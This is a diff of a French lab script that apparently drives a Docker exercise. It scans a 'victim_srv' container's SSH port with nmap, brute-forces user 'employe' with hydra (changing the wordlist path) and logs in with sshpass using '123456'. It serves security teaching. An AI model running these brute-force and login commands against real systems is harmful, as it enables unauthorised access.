@@ -9,7 +9,7 @@ docker exec -it attacker_pc bash
 nmap -p 22 victim_srv
 
 # 2. Attaque brute force sur l'utilisateur 'employe'
-hydra -l employe -P /usr/share/wordlists/rockyou.txt.gz victim_srv ssh -t 4
+hydra -l employe -P /root/wordlist.txt victim_srv ssh -t 4
 # (Si rockyou est trop gros/long, utilisez simplement le mot de passe '123456')
 sshpass -p 123456 ssh employe@victim_srv
 
